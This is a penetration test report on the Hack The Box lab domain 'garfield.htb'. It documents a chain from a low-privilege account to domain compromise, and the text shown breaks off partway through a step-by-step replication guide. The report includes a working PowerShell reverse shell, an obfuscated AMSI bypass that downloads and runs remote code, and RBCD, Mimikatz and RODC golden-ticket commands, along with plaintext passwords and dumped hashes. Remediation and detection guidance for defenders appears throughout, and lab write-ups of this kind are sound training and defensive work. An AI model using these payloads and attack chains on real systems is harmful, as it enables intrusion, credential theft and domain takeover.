# Report of Findings
## Network Penetration Test: Garfield Domain Environment
### HTB CPTS Practice Engagement

---

**Candidate Name:** xmp
**Report Version:** 2.0  
**Assessment Date:** 9 April 2026 5:35 AM
**Target Domain:** garfield.htb  

---

## Statement of Confidentiality

This document contains confidential findings from a penetration test conducted against the Hack The Box machine "Garfield." All activity was performed against a lawfully authorised target environment within the HTB platform. This report is intended solely for educational and portfolio purposes.

---

## Table of Contents

1. Executive Summary
2. Scope and Engagement Details
3. Assessment Approach
4. Technical Findings Summary
5. Detailed Findings
   - Finding 1: Excessive Write Privileges on AD User Object (scriptPath Delegation)
   - Finding 2: Writable SYSVOL Logon Script Directory Enabling Domain-Wide RCE
   - Finding 3: Unprivileged User Holds Password Reset Rights Over Privileged Account
   - Finding 4: Resource-Based Constrained Delegation Misconfiguration on RODC
   - Finding 5: RODC krbtgt_8245 Key Extraction and Golden Ticket Forgery
   - Finding 6: Domain Administrator Credential Exposure via RODC Password Replication Policy Abuse
6. Full Attack Chain: Step-by-Step Replication Guide
7. Remediation Summary
8. Appendix A: Tools Used
9. Appendix B: MITRE ATT&CK Mapping

---

## 1. Executive Summary

A penetration test was performed against the `garfield.htb` Active Directory domain environment. The assessment began from a single set of low-privileged domain credentials (`j.arbuckle:Th1sD4mnC4t!@1978`) and progressed to full domain compromise through a chain of six exploitable misconfigurations.

Six findings were identified, five rated Critical and one High. The most significant weaknesses are excessive Active Directory write permissions granted to unprivileged accounts, a writable SYSVOL scripts directory, and a Read-Only Domain Controller (RODC) whose configuration permitted extraction of its `krbtgt_8245` key and abuse of its Password Replication Policy to expose the domain Administrator credential.

The assessor achieved SYSTEM-level access on `DC01` by recovering the domain Administrator NTLM hash from `RODC01`'s Local Security Authority store and authenticating via impacket-psexec. The `root.txt` flag was retrieved from `C:\Users\Administrator\Desktop\root.txt`.

**Risk Summary**

| Severity | Count |
|---|---|
| Critical | 5 |
| High | 1 |
| Medium | 0 |
| Low | 0 |

---

## 2. Scope and Engagement Details

| Host | IP Address | Role | OS |
|---|---|---|---|
| DC01.garfield.htb | 10.129.25.205 | Primary Domain Controller | Windows Server 2019 Standard Build 17763 |
| RODC01.garfield.htb | 192.168.100.2 (internal) | Read-Only Domain Controller | Windows Server 2019 Datacenter Build 17763 |

**Domain:** `garfield.htb`  
**Domain SID:** `S-1-5-21-2502726253-3859040611-225969357`  
**Starting Credentials:** `j.arbuckle:Th1sD4mnC4t!@1978`  

**Domain Users Identified:**

| Username | Last PW Set | Notes |
|---|---|---|
| Administrator | 2025-10-03 | Built-in domain admin |
| Guest | never | Disabled |
| krbtgt | 2025-08-13 | Standard KDC account |
| krbtgt_8245 | 2025-08-17 | RODC-specific KDC account |
| j.arbuckle | 2025-09-09 | Starting credentials |
| l.wilson | 2026-01-27 | Standard user; target for lateral movement |
| l.wilson_adm | 2026-01-13 | Administrative account; badpwdcount: 1 |

---

## 3. Assessment Approach

Testing followed an internal penetration testing methodology beginning with unauthenticated host discovery and progressing through authenticated enumeration, AD misconfiguration exploitation, lateral movement, and post-exploitation credential extraction.

**Critical Operational Constraint: Kerberos Clock Skew**

The domain exhibited a clock skew of approximately eight hours between the assessor's host and `DC01`:

```
_clock-skew: mean: 8h00m03s, deviation: 0s, median: 8h00m03s
```

All Kerberos-dependent operations fail with `KRB_AP_ERR_SKEW` unless the assessor's system time matches the domain time to within five minutes. This must be corrected before every Kerberos operation using:

```bash
sudo ntpdate 10.129.25.205
```

For tools that do not respect the system clock in real time (impacket-getST, Rubeus via faketime), the `faketime` utility was used to wrap individual commands:

```bash
net time -S 10.129.25.205
faketime '<output from net time>' <command>
```

**Initial `/etc/hosts` Configuration**

```
10.129.25.205  DC01.garfield.htb garfield.htb
```

`RODC01.garfield.htb` resolves internally. After the SOCKS tunnel was established, `/etc/hosts` was updated to include:

```
192.168.100.2  RODC01.garfield.htb
```

---

## 4. Technical Findings Summary

| # | Finding | Severity | CVSS v3.1 |
|---|---|---|---|
| 1 | Excessive Write Privileges on AD User Object (scriptPath) | Critical | 9.9 |
| 2 | Writable SYSVOL Logon Script Directory Enabling RCE | Critical | 9.9 |
| 3 | Unprivileged User Holds Password Reset Rights Over Privileged Account | High | 8.8 |
| 4 | RBCD Misconfiguration on Read-Only Domain Controller | Critical | 9.0 |
| 5 | RODC krbtgt_8245 Key Extraction and Golden Ticket Forgery | Critical | 10.0 |
| 6 | Domain Administrator Credential Exposure via RODC PRP Abuse | Critical | 10.0 |

---

## 5. Detailed Findings

---

### Finding 1: Excessive Write Privileges on AD User Object (scriptPath Delegation)

**Severity:** Critical  
**CVSS v3.1 Score:** 9.9  
**CVSS Vector:** AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H  
**MITRE ATT&CK:** T1484.001, T1037.001  

#### Description

The account `j.arbuckle` was found to hold write access to the `scriptPath` attribute on the `l.wilson` user object (`CN=Liz Wilson,CN=Users,DC=garfield,DC=htb`). The `scriptPath` attribute defines the path of the logon script executed when a user authenticates to the domain. By modifying this attribute, an attacker can redirect `l.wilson`'s logon script to any file accessible from the SYSVOL share, including a malicious payload uploaded by the attacker. Combined with write access to the SYSVOL scripts directory (Finding 2), this creates a reliable code execution primitive requiring only that `l.wilson` authenticate at some point, which in a production environment is reliably triggered by normal work activity.

This is an Active Directory DACL abuse attack. The delegated write permission should not exist on this attribute for a non-administrative account.

#### Discovery

BloodHound confirmed the delegation after collecting domain data with:

```bash
sudo ntpdate 10.129.25.205
faketime '<DC time>' bloodhound-python -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d 'garfield.htb' -dc 'DC01.garfield.htb' -ns 10.129.25.205 -c All
```

Manual confirmation of write access via `bloodyAD`:

```bash
python3 bloodyAD.py -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.25.205 get writable --otype USER --right WRITE --detail
```

#### Exploitation Evidence

The `scriptPath` attribute was set to point at the malicious batch file staged in SYSVOL:

```bash
python3 bloodyAD.py -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.25.205 set object l.wilson scriptPath -v "printerDetect.bat"
[+] l.wilson's scriptPath has been updated
```

Confirmed the attribute value was applied:

```bash
python3 bloodyAD.py -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.25.205 get object l.wilson --attr scriptPath
distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: printerDetect.bat
```

#### Impact

An attacker controlling this attribute gains reliable code execution as `l.wilson` at the user's next domain logon. This requires no exploitation of a software vulnerability; it is pure abuse of an improperly scoped access control entry.

#### Remediation

Audit all non-administrative accounts for write access to `scriptPath` and related logon attributes using the BloodHound query:

```
MATCH p=(u:User)-[:WriteProperty]->(t:User) WHERE u.name <> 'ADMINISTRATOR@GARFIELD.HTB' RETURN p
```

Remove any delegations not explicitly required by a documented business process. Apply the principle of least privilege at the Active Directory DACL level. Use Microsoft's `AD ACL Scanner` for bulk auditing across the domain.

---

### Finding 2: Writable SYSVOL Logon Script Directory Enabling Domain-Wide RCE

**Severity:** Critical  
**CVSS v3.1 Score:** 9.9  
**CVSS Vector:** AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H  
**MITRE ATT&CK:** T1037.001  

#### Description

The `j.arbuckle` account was found to have write access to `\\garfield.htb\SYSVOL\garfield.htb\scripts\`. This directory is the standard location from which domain logon scripts are served to authenticating users. The SYSVOL share is replicated across all domain controllers and is accessible over SMB by every authenticated domain user. Write access to this path must be restricted to domain administrators only. As configured, any user who discovers or is granted this access can stage executable content that will run in the context of any user whose `scriptPath` attribute points to a file in this directory.

The assessor confirmed write access by uploading a test file and verifying it was staged correctly. A proof-of-concept ICMP callback was used to confirm remote execution before deploying the reverse shell.

#### Exploitation Evidence

**Step 1: Write access confirmed, test ICMP payload uploaded:**

```bash
smbclient //10.129.25.205/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'
smb: \garfield.htb\scripts\> put printerDetect.bat
putting file printerDetect.bat as \garfield.htb\scripts\printerDetect.bat
```

Contents of initial proof-of-concept `printerDetect.bat`:

```batch
@echo off
C:\Windows\System32\ping.exe -n 1 10.10.16.145
```

**Step 2: Execution confirmed via ICMP capture:**

```bash
sudo tcpdump -i tun0 icmp
00:03:11.294276 IP garfield.htb > 10.10.16.145: ICMP echo request, id 1, seq 2, length 40
00:03:11.294309 IP 10.10.16.145 > garfield.htb: ICMP echo reply, id 1, seq 2, length 40
```

**Step 3: Reverse shell payload staged:**

Updated `printerDetect.bat` contents (AMSI bypass + staged PowerShell reverse shell):

```batch
@echo off
powershell -nop -w hidden -c "sET-ItEM ('V'+'aR'+'ia'+'blE:HW'+'i') ([TYpE]('S'+'ys'+'te'+'m.M'+'an'+'ag'+'em'+'en'+'t.A'+'ut'+'om'+'at'+'io'+'n.A'+'ms'+'i'+'U'+'ti'+'ls'));(GeT-VaRiaBlE ('H'+'Wi')).ValUE.GeTFiEld(('a'+'ms'+'i'+'S'+'ie'+'Init'+'Fa'+'il'+'ed'),'NonPublic,Static').SeTValUE($null,$true); iex (iwr 'http://10.10.16.145/run.ps1' -useb)"
```

`run.ps1` hosted on the assessor's HTTP server:

```powershell
$c = New-Object System.Net.Sockets.TCPClient('10.10.16.145',4444);
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String);
    $sc = $sb + 'PS ' + (pwd).Path + '> ';
    $sbt = ([text.encoding]::ASCII).GetBytes($sc);
    $s.Write($sbt,0,$sbt.Length);
    $s.Flush()
};
$c.Close()
```

**Step 4: Payload uploaded and scriptPath confirmed:**

```bash
smbclient //10.129.25.205/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'
smb: \garfield.htb\scripts\> put printerDetect.bat

python3 bloodyAD.py -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.25.205 set object l.wilson scriptPath -v "printerDetect.bat"
[+] l.wilson's scriptPath has been updated
```

**Step 5: HTTP server confirmed payload retrieval and reverse shell received:**

```
python3 -m http.server 80
10.129.25.205 - - [09/Apr/2026 00:35:53] "GET /run.ps1 HTTP/1.1" 200 -

nc -lvnp 4444
connect to [10.10.16.145] from (UNKNOWN) [10.129.25.205] 64841
PS C:\Windows\system32> whoami
garfield\l.wilson
```

#### Impact

The assessor obtained interactive command execution as `garfield\l.wilson`. From this context, further enumeration revealed the ability to reset the password of the administrative account `l.wilson_adm`, enabling privilege escalation (Finding 3).

#### Remediation

Remove write access to `SYSVOL\garfield.htb\scripts` from all non-administrative accounts. Verify permissions:

```
icacls \\garfield.htb\SYSVOL\garfield.htb\scripts
```

Enable object access auditing on the scripts directory via Group Policy to generate Event ID 4663 on any unauthorised write attempt. SYSVOL integrity can also be monitored via DFSR health checks and FRS audit policies.

---

### Finding 3: Unprivileged User Holds Password Reset Rights Over Privileged Account

**Severity:** High  
**CVSS v3.1 Score:** 8.8  
**CVSS Vector:** AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  
**MITRE ATT&CK:** T1098  

#### Description

The standard domain account `l.wilson` was found to hold the ability to reset the password of the administrative account `l.wilson_adm` via Active Directory Services Interface (ADSI). This is consistent with either a `ForceChangePassword` or `GenericAll` delegation applied to the `l.wilson_adm` user object. Password reset operations performed via ADSI do not require knowledge of the existing credential and do not generate a failed-authentication event. In the absence of privileged account access monitoring, this type of reset can occur silently from any compromised session holding the relevant delegation.

#### Exploitation Evidence

Executed from the `l.wilson` reverse shell:

```powershell
$dn = "CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb"
$admin = [ADSI]"LDAP://$dn"
$admin.psbase.invoke("SetPassword", @("GarfieldAdminPwned2026"))
```

Confirmed the reset was accepted by verifying the `PwdLastSet` attribute had updated and authenticating:

```powershell
[DateTime]::FromFileTime((Get-ADUser l.wilson_adm -Properties PwdLastSet).PwdLastSet)
```

```bash
evil-winrm -i 10.129.25.205 -u 'l.wilson_adm' -p 'GarfieldAdminPwned2026'
```

Successful WinRM session confirmed as `l.wilson_adm`.

#### Impact

Successful authentication as `l.wilson_adm` granted the assessor the ability to create machine accounts in the domain and configure Resource-Based Constrained Delegation on `RODC01$`, directly enabling Finding 4.

#### Remediation

Audit all Active Directory user objects for `ForceChangePassword`, `GenericAll`, and `GenericWrite` delegations granted to standard user accounts. No unprivileged account should hold any write-capable delegation over a privileged or administrative account object. Privileged accounts should be placed in protected Organisational Units with AdminSDHolder propagation reviewed and enforced. Implement `Protected Users` group membership for all tier 0 and tier 1 accounts.

---

### Finding 4: Resource-Based Constrained Delegation Misconfiguration on Read-Only Domain Controller

**Severity:** Critical  
**CVSS v3.1 Score:** 9.0  
**CVSS Vector:** AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H  
**MITRE ATT&CK:** T1558.001, T1134.001  

#### Description

The `l.wilson_adm` account was found to hold write access to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the `RODC01$` computer object. This attribute governs Resource-Based Constrained Delegation (RBCD) and controls which principals are permitted to obtain Kerberos service tickets impersonating arbitrary users against services hosted on `RODC01`. By creating a new machine account within the domain: a right granted to all authenticated domain users by default via the `ms-DS-MachineAccountQuota` attribute set to 10: and writing that machine account into the RBCD attribute of `RODC01$`, the assessor was able to use `impacket-getST` to obtain a Kerberos service ticket impersonating the domain `Administrator` account for the `cifs` service on `RODC01`.

#### Exploitation Evidence

**Step 1: Machine account created:**

```bash
impacket-addcomputer 'garfield.htb/l.wilson_adm:GarfieldAdminPwned2026' -computer-name 'FOO-PC$' -computer-pass 'ComputerPass123!' -dc-ip 10.129.25.205
```

**Step 2: RBCD delegation configured on RODC01$:**

```bash
impacket-rbcd 'garfield.htb/l.wilson_adm:GarfieldAdminPwned2026' -action write -delegate-to 'RODC01$' -delegate-from 'FOO-PC$' -dc-ip 10.129.25.205
```

**Step 3: Service ticket obtained impersonating Administrator (clock sync required):**

```bash
net time -S 10.129.25.205
faketime 'Thu Apr  9 12:49:35 2026' impacket-getST garfield.htb/'FOO-PC$':'ComputerPass123!' -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator
```

Output confirmed:

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

**Step 4: Ticket loaded and RODC01 accessed:**

```bash
export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

A chisel SOCKS tunnel was established through DC01 to reach RODC01 on the `192.168.100.0/24` internal subnet (see Step-by-Step section). With the tunnel active, WinRM access to RODC01 was obtained using `l.wilson_adm` credentials directly:

```bash
proxychains evil-winrm -i RODC01.garfield.htb -u 'l.wilson_adm' -p 'GarfieldAdminPwned2026'
```

#### Impact

Administrative access to `RODC01` was obtained. From this position, the assessor extracted the `krbtgt_8245` credential, modified the RODC Password Replication Policy, and ultimately recovered the domain Administrator hash, completing domain compromise.

#### Remediation

Remove the write access held by `l.wilson_adm` on `msDS-AllowedToActOnBehalfOfOtherIdentity` for `RODC01$`. Set `MachineAccountQuota` to `0` at the domain level to prevent non-administrative accounts from creating computer objects. Audit all computer objects for unexpectedly populated RBCD attributes:

```powershell
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null }
```

---

### Finding 5: RODC krbtgt_8245 Key Extraction and Golden Ticket Forgery

**Severity:** Critical  
**CVSS v3.1 Score:** 10.0  
**CVSS Vector:** AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H  
**MITRE ATT&CK:** T1558.001, T1003.001  

#### Description

With administrative access to `RODC01`, the assessor used Mimikatz to extract the NTLM hash and AES-256 key of the `krbtgt_8245` account from the Local Security Authority. Each Read-Only Domain Controller maintains a unique `krbtgt` account, distinct from the domain-wide `krbtgt`. Tickets signed by the RODC's `krbtgt` key are validated and accepted by the writable domain controller as legitimate, provided the accounts referenced in those tickets are permitted under the RODC's Password Replication Policy (PRP). An attacker with the `krbtgt_8245` key material can forge Kerberos TGTs for any account in the PRP allow-list, with the RODC number embedded in the ticket to signal which key was used for signing.

This attack is commonly called the RODC Golden Ticket attack. It differs from a standard Golden Ticket in that the forged ticket references the RODC-specific `krbtgt` (number 8245) rather than the domain-wide one, and is constrained to accounts whose credentials the RODC is permitted to cache. The PRP was subsequently modified (Finding 6) to include the domain Administrator, eliminating this constraint.

#### Exploitation Evidence

**Step 1: krbtgt_8245 extracted from RODC01 via Mimikatz:**

Executed from a WinRM session as `l.wilson_adm` on `RODC01`:

```
C:\Users\l.wilson_adm\Documents\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /inject /name:krbtgt_8245
Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357

RID  : 00000643 (1603)
User : krbtgt_8245

 * Primary
    NTLM : 445aa4221e751da37a10241d962780e2

 * Kerberos-Newer-Keys
    Default Salt : GARFIELD.HTBkrbtgt_8245
    aes256_hmac (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
    aes128_hmac (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
    des_cbc_md5 (4096) : d540fe6192b9ecfe
```

**Step 2: RODC Golden Ticket forged with Rubeus:**

```
C:\Users\l.wilson_adm\Documents\Rubeus.exe golden /rodcNumber:8245 /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /nowrap

[*] Building PAC
[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] Service        : krbtgt
[*] Target         : garfield.htb
[*] Forged a TGT for 'Administrator@garfield.htb'
[*] AuthTime       : 4/9/2026 7:22:45 AM
[*] EndTime        : 4/9/2026 5:22:45 PM
[*] base64(ticket.kirbi): doIFkjCC...
```

**Step 3: Ticket injected into the current session:**

```
Rubeus.exe ptt /ticket:doIFkjCC<...full base64 ticket...>
```

#### Impact

A forged TGT for `Administrator` was injected into the current Kerberos credential cache. Combined with the PRP modification in Finding 6, this enabled direct replication of the Administrator's credential to `RODC01`.

#### Remediation

Treat the RODC `krbtgt_8245` account as a tier 0 credential equivalent. If `RODC01` is assessed as compromised, reset the `krbtgt_8245` password immediately. Unlike the standard `krbtgt`, the RODC-specific account can be reset without broad domain-wide impact. Restrict administrative access to RODCs to accounts explicitly designated for that role, and enforce LSASS protection via Credential Guard and the `RunAsPPL` registry setting to prevent Mimikatz LSA injection:

```
HKLM\SYSTEM\CurrentControlSet\Control\LSA
RunAsPPL = dword:00000001
```

Monitor for Sysmon Event ID 10 (LSASS access from non-system processes) and Windows Security Event ID 4656 with `lsass.exe` as the target object.

---

### Finding 6: Domain Administrator Credential Exposure via RODC Password Replication Policy Abuse

**Severity:** Critical  
**CVSS v3.1 Score:** 10.0  
**CVSS Vector:** AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H  
**MITRE ATT&CK:** T1003.006, T1078.002  

#### Description

Having gained administrative access to `RODC01` and the `krbtgt_8245` key, the assessor modified the `msDS-RevealOnDemandGroup` attribute on the `RODC01` computer object to include the domain `Administrator` account. This attribute defines the Password Replication Policy (PRP) allow-list: the set of accounts whose credentials the RODC is permitted to cache. By adding `Administrator` to this list and then executing `repadmin /rodcpwdrepl` to force the credential synchronisation from `DC01` to `RODC01`, the Administrator's NTLM hash and Kerberos keys were replicated to and stored on `RODC01`. A second Mimikatz `lsadump::lsa` execution then extracted those credentials directly from `RODC01`'s LSA store.

The `Denied RODC Password Replication Group` is intended to explicitly exclude sensitive accounts: including `Domain Admins`, `Enterprise Admins`, `krbtgt`, and other privileged accounts: from ever having their credentials cached by any RODC. This control was circumvented because the assessor held the ability to modify `msDS-RevealOnDemandGroup` and `msDS-NeverRevealGroup` on `RODC01$`, and the `Administrator` account was not adequately protected from being added to the allow-list by an account with write access to the RODC object.

#### Exploitation Evidence

**Step 1: Administrator added to RODC allow-list via bloodyAD (from attacker host):**

```bash
bloodyAD -u l.wilson_adm -p 'GarfieldAdminPwned2026' -d garfield.htb --host 10.129.25.205 set object "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" msDS-RevealOnDemandGroup -v "CN=Administrator,CN=Users,DC=garfield,DC=htb"
```

**Step 2: Existing msDS-NeverRevealGroup entries preserved (replacing only with non-sensitive groups to clear blocking):**

```bash
bloodyAD -u l.wilson_adm -p 'GarfieldAdminPwned2026' -d garfield.htb --host 10.129.25.205 set object "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" msDS-NeverRevealGroup -v "CN=Account Operators,CN=Builtin,DC=garfield,DC=htb" -v "CN=Server Operators,CN=Builtin,DC=garfield,DC=htb" -v "CN=Backup Operators,CN=Builtin,DC=garfield,DC=htb"
```

**Step 3: RODC Golden Ticket injected into RODC01 session (from WinRM shell on RODC01):**

```
Rubeus.exe ptt /ticket:doIFkjCC<...>
```

**Step 4: Password replication forced from DC01 to RODC01:**

Executed from the `RODC01` WinRM session after ticket injection:

```
repadmin /rodcpwdrepl RODC01 DC01 "CN=Administrator,CN=Users,DC=garfield,DC=htb"
```

**Step 5: Administrator credentials extracted from RODC01 LSA:**

```
C:\Users\l.wilson_adm\Documents\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:Administrator" "exit"

mimikatz # lsadump::lsa /inject /name:Administrator
Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357

RID  : 000001f4 (500)
User : Administrator

 * Primary
    NTLM : ee238f6debc752010428f20875b092d5

 * Kerberos-Newer-Keys
    aes256_hmac (4096) : 53b9e15b84f5b44ca093b5a74098b26aae113a806a9a7ff647754dc6518e9c29
    aes128_hmac (4096) : f0aaabf4238c8cb0cf30b123d15bc579
```

**Step 6: Domain compromise confirmed via impacket-psexec:**

```bash
impacket-psexec garfield.htb/Administrator@10.129.25.205 -hashes aad3b435b51404eeaad3b435b51404ee:ee238f6debc752010428f20875b092d5
```

```
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```

#### Impact

Full domain compromise. The domain Administrator NTLM hash was extracted and used to authenticate to the primary domain controller as `NT AUTHORITY\SYSTEM`. All domain credentials, Group Policy objects, AD certificate templates, and NTDS.dit content must be considered compromised.

#### Remediation

Ensure the domain `Administrator` account and all tier 0 accounts are permanent members of the `Denied RODC Password Replication Group`:

```powershell
Add-ADGroupMember -Identity "Denied RODC Password Replication Group" -Members "Administrator"
(Get-ADGroup "Denied RODC Password Replication Group" -Properties Members).Members
```

Restrict modification of `msDS-RevealOnDemandGroup` and `msDS-NeverRevealGroup` attributes on RODC computer objects to `Domain Admins` only. After remediation, immediately reset the domain `Administrator` password, rotate `krbtgt_8245`, and perform a full assessment of which accounts had their credentials cached on the RODC during the exposure window. Consider a full `krbtgt` reset if the primary DC is also assessed as compromised. Monitor `repadmin /rodcpwdrepl` commands via Event ID 4928 (Active Directory replica source naming context was established).

---

## 6. Full Attack Chain: Step-by-Step Replication Guide

This section documents the complete attack chain as executed, in sequential order. All commands are exact one-liners. Clock synchronisation steps are noted where required.

---

### Phase 1: Reconnaissance and Initial Enumeration

**Step 1.1: Configure /etc/hosts**

```bash
echo "10.129.25.205  DC01.garfield.htb garfield.htb" | sudo tee -a /etc/hosts
```

**Step 1.2: Full port scan**

```bash
nmap -p- --min-rate 3000 10.129.25.205
```

Ports identified: 53, 88, 135, 139, 389, 445, 464, 593, 636, 2179, 3268, 3269, 3389, 5985, 9389, and RPC high ports.

**Step 1.3: Service version scan against identified ports**

```bash
nmap -p 53,88,135,139,389,445,464,593,636,2179,3268,3269,3389,5985,9389,49667,49670,49671,49673,49674,49900 -sCV 10.129.25.205
```

Key output:

```
389/tcp open  ldap  Microsoft Windows Active Directory LDAP (Domain: garfield.htb0.)
3389/tcp open  ms-wbt-server
  rdp-ntlm-info:
    DNS_Domain_Name: garfield.htb
    DNS_Computer_Name: DC01.garfield.htb
    Product_Version: 10.0.17763
_clock-skew: mean: 8h00m03s
```

**Confirmed:** Windows Server 2019, domain `garfield.htb`, hostname `DC01`. Clock skew of eight hours noted.

**Step 1.4: Synchronise system clock (required before every Kerberos operation)**

```bash
sudo ntpdate 10.129.25.205
```

**Step 1.5: SMB share enumeration**

```bash
crackmapexec smb 10.129.25.205 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares --users
```

Relevant output:

```
NETLOGON  READ  Logon server share
SYSVOL    READ  Logon server share

garfield.htb\l.wilson_adm  badpwdcount: 1
garfield.htb\l.wilson
garfield.htb\j.arbuckle
garfield.htb\krbtgt_8245   Key Distribution Center service account for read-only domain controller
```

`krbtgt_8245` in the user list signals the presence of an RODC in the environment.

**Step 1.6: Retrieve logon script from NETLOGON share**

```bash
smbclient //10.129.25.205/NETLOGON -U 'j.arbuckle%Th1sD4mnC4t!@1978'
smb: \> get printerdetect.bat
```

**Step 1.7: Full LDAP dump**

```bash
ldapsearch -x -H ldap://10.129.25.205 -D "j.arbuckle@garfield.htb" -w 'Th1sD4mnC4t!@1978' -b "DC=garfield,DC=htb" "(objectClass=*)" > ldap_full.txt
```

Notable entries from the dump:

```
sAMAccountName: RODC01$
dNSHostName: RODC01.garfield.htb
servicePrincipalName: krbtgt/RODC01.garfield.htb
msDS-IsFullReplicaFor: CN=NTDS Settings,CN=RODC01,...
```

This confirms `RODC01` is a fully configured Read-Only Domain Controller replicating from `DC01`.

**Step 1.8: NXC group and user enumeration**

```bash
nxc ldap 10.129.25.205 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --groups
nxc ldap 10.129.25.205 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
nxc ldap 10.129.25.205 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --pass-pol
```

Notable group: `IT Support` (1 member), `Tier 1` (1 member). Account lockout threshold: 0 (no lockout policy: password spraying is safe).

**Step 1.9: Attempt Kerberoasting and AS-REP roasting**

```bash
sudo ntpdate 10.129.25.205
nxc ldap 10.129.25.205 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --kerberoasting kerb_hashes.txt
nxc ldap 10.129.25.205 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --asreproast asrep_hashes.txt
```

No results returned from either. No service accounts with SPNs, no accounts with `DONT_REQUIRE_PREAUTH`.

**Step 1.10: BloodHound collection**

```bash
sudo systemctl stop systemd-timesyncd
sudo ntpdate 10.129.25.205
faketime "$(net time -S 10.129.25.205 | head -n 1)" bloodhound-python -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d 'garfield.htb' -dc 'DC01.garfield.htb' -ns 10.129.25.205 -c All
```

BloodHound confirms `j.arbuckle` holds `WriteProperty` on `scriptPath` for `l.wilson`.

---

### Phase 2: Initial Foothold: l.wilson via Logon Script Abuse

**Step 2.1: Create ICMP proof-of-concept payload**

```bash
cat > printerDetect.bat << 'EOF'
@echo off
C:\Windows\System32\ping.exe -n 1 10.10.16.145
EOF
```

**Step 2.2: Upload to SYSVOL scripts directory**

```bash
smbclient //10.129.25.205/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c "cd garfield.htb\\scripts; put printerDetect.bat"
```

**Step 2.3: Set l.wilson's scriptPath attribute**

```bash
python3 bloodyAD.py -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.25.205 set object l.wilson scriptPath -v "printerDetect.bat"
```

**Step 2.4: Confirm attribute was applied**

```bash
python3 bloodyAD.py -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.25.205 get object l.wilson --attr scriptPath
```

**Step 2.5: Start ICMP listener to confirm execution**

```bash
sudo tcpdump -i tun0 icmp
```

Wait for ICMP echo request from `garfield.htb`. Once confirmed, payload execution is verified.

**Step 2.6: Create staged reverse shell payload**

Create `run.ps1` in the web server directory:

```bash
cat > run.ps1 << 'EOF'
$c = New-Object System.Net.Sockets.TCPClient('10.10.16.145',4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sc = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sc);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()
EOF
```

Create `printerDetect.bat` with AMSI bypass and staged download:

```bash
cat > printerDetect.bat << 'EOF'
@echo off
